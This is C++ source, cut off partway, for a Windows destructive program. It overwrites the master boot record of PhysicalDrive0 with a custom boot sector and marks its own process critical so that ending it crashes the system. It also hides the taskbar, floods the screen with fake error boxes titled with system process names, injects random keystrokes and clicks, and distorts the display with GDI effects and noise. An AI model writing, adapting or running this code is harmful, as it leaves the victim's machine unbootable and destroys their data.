#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

const unsigned char MasterBootRecord[] = { 0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xFF, 0x8E, 0xDF,
0xD9, 0x06, 0x7B, 0x7C, 0xBD, 0xC8, 0x00, 0xD9, 0x06, 0x7B, 0x7C, 0xBA, 0x40, 0x01, 0xD9, 0xEE,
0xD9, 0xEE, 0xB0, 0x64, 0xD9, 0xC0, 0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xE9, 0xD8, 0xC3,
0xD9, 0xC1, 0xD9, 0xC3, 0xDE, 0xC9, 0xDC, 0xC0, 0xD8, 0xC5, 0xDD, 0xDB, 0xDD, 0xD9, 0xD9, 0xC0,
0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xC1, 0xDF, 0x1E, 0x87, 0x7C, 0x83, 0x3E, 0x87, 0x7C,
0x04, 0x7D, 0x04, 0xFE, 0xC8, 0x75, 0xCD, 0xDD, 0xD8, 0xDD, 0xD8, 0x01, 0xF0, 0xAA, 0xD8, 0x06,
0x73, 0x7C, 0x4A, 0x75, 0xB9, 0xDD, 0xD8, 0xD8, 0x06, 0x77, 0x7C, 0x4D, 0x75, 0xA9, 0x46, 0xDD,
0xD8, 0xEB, 0x99, 0x9A, 0x99, 0x19, 0x3C, 0x8F, 0xC2, 0x75, 0x3C, 0x00, 0x00, 0xC0, 0xBF, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
    return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
    HKEY hKey;
    DWORD dwDisposition;
    LONG result;
    result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
    return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

DWORD WINAPI train(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, 0x1900AC010E);
        BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, 0x1900AC010E);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI mash(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, SRCINVERT);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI lines(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        POINT pt[4] = { rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h };
        HPEN pen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, pen);
        Polyline(hdc, pt, 4);
        DeleteObject(pen);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI textout(LPVOID lpvd) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    while (true) {
        for (int i = 0; i < x; i++) {
            HDC hdc = GetDC(0);
            SetBkMode(hdc, 0);
            LPCSTR text = "znpg17nyx6w4";
            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            HFONT font = CreateFontA(rand() % 59 + 1, rand() % 39 + 1, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
            SelectObject(hdc, font);
            TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
            DeleteObject(font);
            ReleaseDC(0, hdc);
        }
        Sleep(1000);
    }
}

HRGN CreateHexagonRgn(int x, int y, int size) {
    POINT points[7];
    double angle = 2 * M_PI / 6;
    for (int i = 0; i < 6; i++) {
        points[i].x = x + (int)(size * cos(i * angle));
        points[i].y = y + (int)(size * sin(i * angle));
    }
    points[6] = points[0];
    return CreatePolygonRgn(points, 7, WINDING);
}

VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateHexagonRgn(x, y, w / 2);
    SelectClipRgn(hdc, hrgn);
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500;
    int h = rect.bottom - rect.top - 500;
    for (int t = 0;; t++) {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2;
        int y = rand() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 100) {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
}

DWORD WINAPI icons(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = rand() % GetSystemMetrics(0);
        int y = rand() % GetSystemMetrics(1);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        Sleep(10);
        InvalidateRect(0, 0, 0);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI stretch(LPVOID lpParam) {
    double angle = 0.0;
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int xadd = (int)(sin(angle) * 50.0);
        int yadd = (int)(cos(angle) * 50.0);
        SetStretchBltMode(hdc, 3);
        StretchBlt(hdc, xadd / 2, yadd / 2, w - xadd, h - yadd, hdc, 0, 0, w, h, NOTSRCERASE);
        angle = angle + 0.1963495408493621;
        DeleteObject(hdc);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / h, t = y ^ y | x;
            data[i].rgb += RGB(x, y, t);
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, desk);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI train1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, -30, w, h, hdc, 0, 0, 0x1900AC010E);
        BitBlt(hdc, 0, h - 30, w, h, hdc, 0, 0, 0x1900AC010E);
        BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, 0x1900AC010E);
        BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, 0x1900AC010E);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI star(LPVOID lpParam) {
    int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
    int incrementation = 10;
    int x = 10, y = 10;
    while (true) {
        HDC hdc = GetDC(0);
        x += incrementation * sx;
        y += incrementation * sy;
        int cx = x + 75, cy = y + 75;
        int rad = 75;
        POINT starPoints[7];
        for (int i = 0; i < 7; ++i) {
            double angle = 5.6 * M_PI * i / 7;
            starPoints[i].x = cx + static_cast<int>(rad * cos(angle));
            starPoints[i].y = cy + static_cast<int>(rad * sin(angle));
        }
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        Polygon(hdc, starPoints, 6);
        if (cy >= GetSystemMetrics(1)) {
            sy = -1;
        }
        if (cx >= GetSystemMetrics(0)) {
            sx = -1;
        }
        if (cy <= 0) {
            sy = 1;
        }
        if (cx <= 0) {
            sx = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI hell1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(0);
        BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, h, w, hdc, 0, 0, NOTSRCCOPY);
        BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, w, h, hdc, 0, 0, 0x9273ECEF);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI ci1(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    POINT points[3] = { {0, 0}, {0, 0}, {0, 0} };
    points[0] = { x, y };
    points[1] = { x + w, y };
    points[2] = { x + w / 2, y + h };
    HRGN hrgn = CreatePolygonRgn(points, 3, WINDING);
    SelectClipRgn(hdc, hrgn);
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    DeleteObject(brush);
    ReleaseDC(0, hdc);
}

DWORD WINAPI wef1(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500;
    int h = rect.bottom - rect.top - 500;
    for (int t = 0;; t++) {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2;
        int y = rand() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 100) {
            ci1(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
}

DWORD WINAPI textout1(LPVOID lpvd) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        SetBkMode(hdc, 0);
        LPCSTR text = "znpg17nyx6w4";
        SetTextColor(hdc, Hue(239));
        HFONT font = CreateFontA(43, 32, rand() % 3600, rand() % 3600, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text, strlen(text));
        DeleteObject(font);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / h, t = y ^ y | x;
            data[i].r *= i;
            data[i].g ^= i;
            data[i].b &= i;
            data[i].rgb += 1000 | i + i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, desk);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 9 ^ (t >> 7) - 1 ^ 1) % 13 * t & 31) * (2 + (t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 7 ^ (t >> 30) - 1 ^ 1) % 1563));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 9 | t | t) + 44 * (t >> 13 & t | t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(104 * (t | t | t >> 24) - 90 * (t | t >> 8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 6) * (t >> 1) | t >> (t & 4096 ? 3 : 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1 & t) * (t >> 9 | 10 < t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t >> 2 & (t >> 4 + 3 * (3 & t ^ 6 >> 9) % 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t / 10 ^ (t / 230 | 2) - t << 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI taskbar(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

DWORD WINAPI msg(LPVOID lpParam) {
    while (true) {
        MessageBox(NULL, string(), L"csrss.exe", MB_ICONERROR | MB_RETRYCANCEL);
    }
    return 0;
}

DWORD WINAPI msg1(LPVOID lpParam) {
    while (true) {
        MessageBox(NULL, string(), L"lsass.exe", MB_ICONWARNING | MB_OKCANCEL);
    }
    return 0;
}

DWORD WINAPI msg2(LPVOID lpParam) {
    while (true) {
        MessageBox(NULL, string(), L"wininit.exe", MB_ICONASTERISK | MB_YESNO | MB_RTLREADING);
    }
    return 0;
}

DWORD WINAPI input(LPVOID lpParam) {
    while (true) {
        INPUT input;
        input.type = INPUT_KEYBOARD;
        input.ki.wVk = (rand() % (90 - 48)) + 48;
        SendInput(1, &input, sizeof(INPUT));
        Sleep(100);
    }
    return 1;
}

DWORD WINAPI click(LPVOID lpParam) {
    INPUT input;
    input.type = INPUT_MOUSE;
    while (true) {
        input.mi.dwFlags = (rand() % 2) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTUP;
